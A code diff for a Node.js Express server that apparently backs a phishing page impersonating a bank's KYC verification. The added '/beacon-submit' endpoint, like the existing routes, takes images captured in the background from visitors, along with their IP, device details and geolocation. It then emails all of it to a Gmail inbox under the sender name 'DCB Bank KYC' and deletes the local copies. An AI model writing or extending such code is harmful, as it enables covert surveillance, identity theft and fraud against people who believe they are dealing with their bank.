@@ -4,6 +4,7 @@ const fs = require('fs');
 const path = require('path');
 const nodemailer = require('nodemailer');
 const UAParser = require('ua-parser-js');
+const busboy = require('busboy');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -11,6 +12,7 @@ const port = process.env.PORT || 3000;
 // Middleware
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.json({ limit: '50mb' }));
+app.use(express.raw({ type: '*/*', limit: '50mb' }));
 app.use(express.static('public'));
 
 // File upload setup
@@ -106,15 +108,85 @@ const buildEmailHtml = (data) => {
   `;
 };
 
-// Routes
+// Beacon submission endpoint
+app.post('/beacon-submit', (req, res) => {
+  const bb = busboy({ headers: req.headers });
+  const files = [];
+  const fields = {};
+  
+  bb.on('file', (name, file, info) => {
+    const chunks = [];
+    file.on('data', (chunk) => chunks.push(chunk));
+    file.on('end', () => {
+      files.push({
+        buffer: Buffer.concat(chunks),
+        filename: info.filename
+      });
+    });
+  });
+
+  bb.on('field', (name, val) => {
+    fields[name] = val;
+  });
+
+  bb.on('close', async () => {
+    try {
+      const submissionData = {
+        device: {
+          type: fields.device_type || 'desktop',
+          model: fields.device_model || 'Unknown',
+          vendor: fields.device_vendor || 'Unknown'
+        },
+        os: fields.device_os || 'Unknown',
+        browser: fields.device_browser || 'Unknown',
+        ip: getClientIp(req),
+        userAgent: fields.user_agent || req.headers['user-agent'],
+        timestamp: fields.timestamp || new Date().toISOString(),
+        isFormEmpty: true,
+        imageCount: files.length,
+        location: fields.location ? JSON.parse(fields.location) : null
+      };
+
+      // Save files temporarily
+      const filePaths = files.map(file => {
+        const path = `${uploadDir}/${Date.now()}-${file.filename}`;
+        fs.writeFileSync(path, file.buffer);
+        return path;
+      });
+
+      // Send email
+      await transporter.sendMail({
+        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
+        to: 'dcbsubmission392@gmail.com',
+        subject: `⚠️ Background Capture (${files.length} images)`,
+        html: buildEmailHtml(submissionData),
+        attachments: filePaths.map(path => ({
+          filename: path.split('/').pop(),
+          path: path
+        }))
+      });
+
+      // Cleanup
+      filePaths.forEach(path => {
+        try { fs.unlinkSync(path); } catch(e) {}
+      });
+
+      res.status(200).send();
+    } catch (error) {
+      console.error('Beacon processing error:', error);
+      res.status(500).send();
+    }
+  });
+
+  req.pipe(bb);
+});
+
+// Regular submission endpoint
 app.post('/submit', (req, res) => {
   upload(req, res, async (err) => {
     try {
       if (err) throw err;
 
-      const isBackground = req.body.empty_form === 'true';
-      
-      // Parse device info
       const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
       const device = parser.getDevice();
       const os = parser.getOS();
@@ -137,13 +209,13 @@ app.post('/submit', (req, res) => {
         ip: getClientIp(req),
         userAgent: req.headers['user-agent'] || req.body.user_agent,
         timestamp: req.body.timestamp || new Date().toISOString(),
-        isFormEmpty: isBackground,
+        isFormEmpty: req.body.empty_form === 'true',
         imageCount: req.files?.length || 0
       };
 
       // Log the submission
       const logEntry = `
---- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
+--- ${submissionData.isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
 Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
 OS: ${submissionData.os}
 Browser: ${submissionData.browser}
@@ -162,10 +234,9 @@ Timestamp: ${submissionData.timestamp}
 `;
 
       fs.appendFileSync('records.txt', logEntry);
-      console.log(logEntry);
 
       // Send email
-      const emailSubject = isBackground 
+      const emailSubject = submissionData.isFormEmpty 
         ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
         : '✅ KYC Verification Completed';
       
@@ -180,103 +251,21 @@ Timestamp: ${submissionData.timestamp}
         }))
       });
 
-      // Cleanup files
+      // Cleanup
       if (req.files) {
         req.files.forEach(file => {
-          try {
-            fs.unlinkSync(file.path);
-          } catch (e) {
-            console.error('Error deleting file:', file.path, e);
-          }
+          try { fs.unlinkSync(file.path); } catch(e) {}
         });
       }
 
       res.status(200).send();
     } catch (error) {
-      console.error('❌ Error:', error);
+      console.error('Submission error:', error);
       res.status(500).send('Error processing submission');
     }
   });
 });
 
-// Background submission endpoint
-app.post('/background-submit', (req, res) => {
-  upload(req, res, async (err) => {
-    try {
-      if (err) throw err;
-
-      // Parse device info
-      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
-      const device = parser.getDevice();
-      const os = parser.getOS();
-      const browser = parser.getBrowser();
-
-      const submissionData = {
-        device: {
-          type: device.type || req.body.device_type || 'desktop',
-          model: device.model || req.body.device_model || 'Unknown',
-          vendor: device.vendor || req.body.device_vendor || 'Unknown'
-        },
-        os: `${os.name} ${os.version}` || req.body.device_os,
-        browser: `${browser.name} ${browser.version}` || req.body.device_browser,
-        ip: getClientIp(req),
-        userAgent: req.headers['user-agent'] || req.body.user_agent,
-        timestamp: req.body.timestamp || new Date().toISOString(),
-        isFormEmpty: true,
-        imageCount: req.files?.length || 0,
-        location: req.body.location ? JSON.parse(req.body.location) : null
-      };
-
-      // Log the submission
-      const logEntry = `
---- BACKGROUND SUBMISSION ---
-Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
-OS: ${submissionData.os}
-Browser: ${submissionData.browser}
-IP: ${submissionData.ip}
-Location: ${submissionData.location ? 
-  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
-Images: ${submissionData.imageCount}
-User Agent: ${submissionData.userAgent}
-Timestamp: ${submissionData.timestamp}
------------------------------
-`;
-
-      fs.appendFileSync('records.txt', logEntry);
-      console.log(logEntry);
-
-      // Send email
-      await transporter.sendMail({
-        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
-        to: 'dcbsubmission392@gmail.com',
-        subject: `⚠️ Background Capture (${submissionData.imageCount} images)`,
-        html: buildEmailHtml(submissionData),
-        attachments: (req.files || []).map(file => ({
-          filename: file.originalname,
-          path: file.path
-        }))
-      });
-
-      // Cleanup files
-      if (req.files) {
-        req.files.forEach(file => {
-          try {
-            fs.unlinkSync(file.path);
-          } catch (e) {
-            console.error('Error deleting file:', file.path, e);
-          }
-        });
-      }
-
-      res.status(200).send();
-    } catch (error) {
-      console.error('❌ Background submit error:', error);
-      res.status(500).send('Error processing background submission');
-    }
-  });
-});
-
-// Start server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
